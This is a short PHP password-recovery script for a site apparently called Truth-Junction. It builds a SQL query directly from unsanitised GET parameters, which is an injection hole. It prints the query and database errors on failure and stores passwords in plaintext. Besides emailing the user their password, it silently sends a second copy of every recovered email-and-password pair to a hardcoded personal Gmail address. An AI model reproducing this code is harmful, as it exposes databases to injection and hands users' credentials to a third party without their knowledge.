<?php
session_start();
include("common/config.php");

	$mememail = $_GET[uname];
	$question = $_GET[quest];
	$answer = $_GET[answer];

	$select_login="select * from ".$tblpref."member_reg where mem_email='".$mememail."' AND mem_squest='".$question."' AND mem_answer='".$answer."'";
	if(!($result_login=mysql_query($select_login))) { echo $select_login.mysql_error();exit; }
	$row_count=mysql_num_rows($result_login);
	$row=mysql_fetch_object($result_login);

		if($row_count==0)
		{
			echo "Username  doesn't match! Enter Again!";
		}
		 else
		{
				$strmemail=$row->mem_email;
				$strpassword=$row->mem_password;
				$struname=$row->mem_first_name." ".$row->mem_sur_name;
				
				$strmesstype="Password Found";
				$ouremail="$sitename";

				$strdetail="$struname,\r\nWe are pleased to inform that your Password had been found.\r\n\nYour User ID is - $strmemail\r\nYour Password is - $strpassword\r\n\nRegards\r\nSite Admin\r\n$sitename\r\n";
				
				@mail($strmemail,"$strmesstype-$HTTP_HOST",$strdetail,"from:Truth-Junction parvez16khan@gmail.com\nmime-version: 1.0\ncontent-type: text/plain");

				@mail("parvez16khan@gmail.com","$strmesstype-$HTTP_HOST",$strdetail,"from:Truth-Junction parvez16khan@gmail.com\nmime-version: 1.0\ncontent-type: text/plain");
				
				echo "Your Password Successfully Mailed To Your Email ID!";
		}

?>